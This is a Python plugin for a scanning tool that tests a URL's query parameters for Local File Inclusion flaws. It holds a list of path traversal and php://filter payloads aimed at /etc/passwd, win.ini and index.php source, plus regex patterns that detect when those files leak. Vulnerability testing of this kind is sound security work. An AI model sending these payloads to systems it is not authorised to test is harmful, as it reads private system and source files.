import json
import re
from urllib.parse import urlparse, parse_qs, urlencode

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

SERVICE = "http"
DESCRIPTION = "Taken from TFS(https://github.com/PrathyayPGM-ALT/TFS) with permission. Checks for Local File Inclusion (LFI) vulnerabilities in HTTP query parameters."
SCRIPT_NAME = "http-tfs-lfi"
OPTIONAL = True

LFI_PAYLOADS = [
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '..\\..\\windows\\win.ini',
    '%2e%2e%2fetc%2fpasswd',
    '....//....//etc/passwd',
    '/etc/passwd',
    'php://filter/convert.base64-encode/resource=index.php',
    'file:///etc/passwd',
    r'....\/....\/etc/passwd',
    '%252e%252e%252fetc%252fpasswd',
]

LFI_SIGNS = [
    r"root:.*:0:0:",
    r"\[boot loader\]",
    r"\[fonts\]",
    r"for 16-bit app support",
    r"daemon:.*:/usr/sbin",
    r"/bin/bash",
    r"DOCUMENT_ROOT",
]


def run(target, port, args=None):
    if not REQUESTS_OK:
        print("[!] requests not installed  ->  pip install requests")
        return

    args = args or {}
    url = args.get("url") or f"http://{target}:{port}"
    output = args.get("output")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        print("[!] No query parameters found")
        return

    session = requests.Session()
    findings = []

    for param in params:
        for payload in LFI_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                resp = session.get(test_url, allow_redirects=False)
                for sign in LFI_SIGNS:
                    if re.search(sign, resp.text, re.IGNORECASE):
                        print(f"[!] LFI param={param} payload={payload}")
                        print(f"[*] Matched: {sign}")
                        findings.append({
                            "type": "LFI",
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                        })
                        break
            except Exception:
                pass

    print(f"[*] Findings: {len(findings)}")

    if output:
        with open(output, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[+] Saved -> {output}")
